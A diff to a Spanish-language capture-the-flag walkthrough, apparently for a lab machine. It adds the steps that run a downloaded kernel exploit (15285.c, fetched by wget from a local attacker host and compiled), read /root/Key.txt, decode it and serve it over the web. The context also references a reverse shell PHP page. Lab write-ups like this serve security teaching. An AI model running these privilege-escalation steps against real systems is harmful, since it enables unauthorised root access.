@@ -144,7 +144,7 @@ URL: `http://192.168.25.131:666/reverseshell.php`
 
 ![21](https://user-images.githubusercontent.com/75953873/182731893-d0f3e803-277c-422d-b78c-fd9f8c22c66d.png)
 
-- *Paso 10:* Buscar y explotar versión del kernel:
+- *Paso 10:* Identificar versión del kernel y descargar exploit:
 
 ![22](https://user-images.githubusercontent.com/75953873/182732251-c05c0ba1-7e2e-4da5-a75c-8676435d3a96.png)
 
@@ -166,3 +166,23 @@ wget http://192.168.1.9/15285.c
 gcc 15285.c -o kernel
 ```
 ![24](https://user-images.githubusercontent.com/75953873/182735176-1cd40bee-e4d0-4956-bc1e-2e593608b292.png)
+
+Explotar kernel:
+```
+./kernel
+```
+![26](https://user-images.githubusercontent.com/75953873/182735618-d1d80e24-f62d-4679-b2fa-1d745dfe8abf.png)
+
+Acceder al directorio `/root` y capturar la flag:
+```
+cd /root
+cat Key.txt
+```
+Descifrar contenido del fichero con base64 y moverlo al servidor local `/var/www`:
+```
+base64 -d Key.txt > flag
+mv flag /var/www
+```
+URL: `http://192.168.25.131:666/flag`
+
+![28](https://user-images.githubusercontent.com/75953873/182736188-909c542c-55ad-46ea-962a-517ede01b93d.png)
